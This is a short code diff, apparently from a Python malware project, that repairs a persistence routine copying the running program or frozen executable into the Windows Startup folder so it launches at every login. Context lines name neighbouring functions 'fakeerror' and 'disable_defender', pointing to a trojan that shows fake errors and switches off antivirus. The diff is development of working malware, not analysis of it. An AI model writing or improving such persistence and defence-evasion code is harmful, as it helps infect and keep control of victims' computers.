@@ -131,11 +131,17 @@ def fakeerror():
 
 
 def startup():
-    startup_path = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Start-up")
-    target_path = os.path.join(startup_path, os.path.basename(__file__))
+    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if hasattr(sys, 'frozen'):
+        source_path = sys.executable
+    else:
+        source_path = sys.argv[0]
+
+    target_path = os.path.join(startup_path, os.path.basename(source_path))
     if os.path.exists(target_path):
         os.remove(target_path)
-    subprocess.run(["copy", __file__, startup_path], shell=True, check=True)
+
+    copy2(source_path, startup_path)
 
 
 def disable_defender():
